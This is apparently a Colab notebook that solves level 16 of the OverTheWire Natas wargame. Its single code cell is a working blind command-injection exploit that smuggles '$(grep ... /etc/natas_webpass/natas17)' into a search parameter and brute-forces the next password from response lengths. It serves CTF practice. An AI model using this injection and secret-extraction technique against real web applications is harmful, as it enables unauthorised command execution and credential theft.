{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyPBNie7Do++s1YC8FziNpX2",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/KMohZaid/Natas-CTF-Code/blob/main/Natas_CTF_Code.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "## I am using google colab for fast bruteforcing in CTF."
      ],
      "metadata": {
        "id": "-IBlDDeprBjJ"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## My PC is not fast like colab so it takes time"
      ],
      "metadata": {
        "id": "s-Kb7cB5rVRA"
      }
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "id": "bl6h79sCoYXI"
      },
      "outputs": [],
      "source": [
        "# Natas CTF level 16 -> 17\n",
        "import requests\n",
        "from time import sleep\n",
        "from string import digits, ascii_lowercase, ascii_uppercase\n",
        "charset = ascii_lowercase + ascii_uppercase + digits\n",
        "s = requests.Session()\n",
        "s.auth = ('natas16', '<censored>')\n",
        "password = \"\"\n",
        "print(password, end=\"\")\n",
        "# We assume that the password is 32 chars\n",
        "while len(password) < 32:\n",
        "    for char in charset:\n",
        "        payload = {\n",
        "            'needle': '$(grep -E ^%s.* /etc/natas_webpass/natas17)' % (password + char)}\n",
        "        tries = 0\n",
        "        while True:\n",
        "            if tries >= 10:\n",
        "                print(\"\\nError occur 10 times, exiting...\")\n",
        "                print(\"currently finded password : \" + password)\n",
        "                exit(1)\n",
        "            try:\n",
        "                r = s.get(\n",
        "                    'http://natas16.natas.labs.overthewire.org/index.php', params=payload)\n",
        "                break\n",
        "            except Exception as e:\n",
        "                tries += 1\n",
        "                sleep(5)\n",
        "\n",
        "        if len(r.text) == 1105: # TODO: can be more specific by checking if dictionary words are in text or not. size may be same if some error website display with same length\n",
        "            print(char, end=\"\")\n",
        "            password += char\n",
        "            break"
      ]
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "YyFsTkp9rFfH"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}